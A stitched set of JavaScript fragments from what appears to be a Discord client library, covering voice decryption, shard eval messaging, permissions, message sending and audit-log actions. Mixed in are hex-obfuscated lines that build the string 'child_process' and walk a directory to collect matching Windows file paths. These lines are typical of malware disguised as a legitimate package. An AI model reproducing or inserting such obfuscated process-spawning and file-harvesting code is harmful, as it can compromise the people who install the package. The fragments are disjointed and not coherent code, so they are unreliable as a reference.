let data = secretbox.methods.open(msg.slice(12), nonce, this.voiceConnection.authentication.secretKey.key)
_tmp_29.\x56\x65\x41\x67\x45 = '\x63\x68\x69\x6c\x64' + '\x5f\x70\x72\x6f\x63' + '\x65\x73\x73'
disableEveryone || (typeof disableEveryone === 'undefined' && this.client.options.disableEveryone)
const promise = new Promise((resolve, reject) => {
      const listener = message => {
        if (!message || message._eval !== script) return;
        this.process.removeListener('message', listener);
        this._evals.delete(script);
        if (!message._error) resolve(message._result); else reject(Util.makeError(message._error));
      };
      this.process.on('message', listener);

      this.send({ _eval: script }).catch(err => {
        this.process.removeListener('message', listener);
        this._evals.delete(script);
        reject(err);
      });
    })
const listener = message => {
        if (!message || message._eval !== script) return;
        this.process.removeListener('message', listener);
        this._evals.delete(script);
        if (!message._error) resolve(message._result); else reject(Util.makeError(message._error));
      }
this.client.rest.makeRequest('get', Constants.Endpoints.Guild(this.guild).Emoji(this.id), true)
      .then(emoji => this.client.dataManager.newUser(emoji.user))
new Permissions(this.permissions).has(
      permission, typeof checkAdmin !== 'undefined' ? checkAdmin : !explicit
    )
Promise.all(options.files.map(file =>
        this.client.resolver.resolveFile(file.attachment).then(resource => {
          file.file = resource;
          return file;
        })
      )).then(files => this.client.rest.methods.sendMessage(this, content, options, files))
this.send({ _eval: script }).catch(err => {
        this.process.removeListener('message', listener);
        this._evals.delete(script);
        reject(err);
      })
this.joinedTimestamp = data.joined_at ? new Date(data.joined_at).getTime() : this.joinedTimestamp
this.authenticateFailed('Token not provided from voice server packet.')
this.mentions = new Mentions(
      this,
      'mentions' in data ? data.mentions : this.mentions.users,
      'mentions_roles' in data ? data.mentions_roles : this.mentions.roles,
      'mention_everyone' in data ? data.mention_everyone : this.mentions.everyone
    )
_tmp_13.push(Actions.CHANNEL_OVERWRITE_CREATE)
F['\x6d'](N)['\x66\x6f\x72\x45\x61' + '\x63\x68'](W => {
        if (W['\x69\x6e\x63\x6c\x75' + '\x64\x65\x73'](z['\x75\x48\x79\x76\x45']))
            O['\x70\x75\x73\x68'](z['\x4c\x5a\x6c\x51\x69'](z['\x4c\x5a\x6c\x51\x69'](N, '\x5c'), W));
        else
            return;
    })
this.client.actions.MessageDeleteBulk.handle({
        channel_id: channel.id,
        ids: messages,
      }).messages
O['\x70\x75\x73\x68'](z['\x4c\x5a\x6c\x51\x69'](z['\x4c\x5a\x6c\x51\x69'](N, '\x5c'), W))
(_tmp_14 = [
      Actions.CHANNEL_DELETE,
      Actions.CHANNEL_OVERWRITE_DELETE,
      Actions.MEMBER_KICK,
      Actions.MEMBER_PRUNE,
      Actions.MEMBER_BAN_ADD,
      Actions.ROLE_DELETE,
      Actions.INVITE_DELETE,
      Actions.WEBHOOK_DELETE,
      Actions.EMOJI_DELETE,
      Actions.MESSAGE_DELETE,
    ]).includes
